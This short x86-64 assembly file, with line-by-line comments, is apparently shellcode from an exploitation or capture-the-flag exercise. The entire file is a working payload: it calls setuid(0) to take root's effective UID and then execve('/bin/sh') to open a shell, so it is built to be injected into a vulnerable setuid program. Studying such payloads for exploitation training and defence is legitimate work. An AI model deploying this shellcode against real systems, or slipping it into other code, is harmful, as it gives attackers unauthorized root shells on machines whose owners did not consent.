.global _start
_start:
.intel_syntax noprefix
	mov rax, 105                # syscall number for setuid
	mov rdi, 0                  # calling setuid with 0 as parameter. This will set the eUID as 0, which is the same value as root.
	syscall
	mov rax, 59                 # syscall number for execve
	lea rdi, [rip+binsh]        # This makes rdi point to the location of the string "/bin/sh" which we call to get a sh shell.
	mov rsi, 0                  # No parameters for execve
	mov rdx, 0                  # No env for execve
	syscall
binsh:
	.string "/bin/sh"

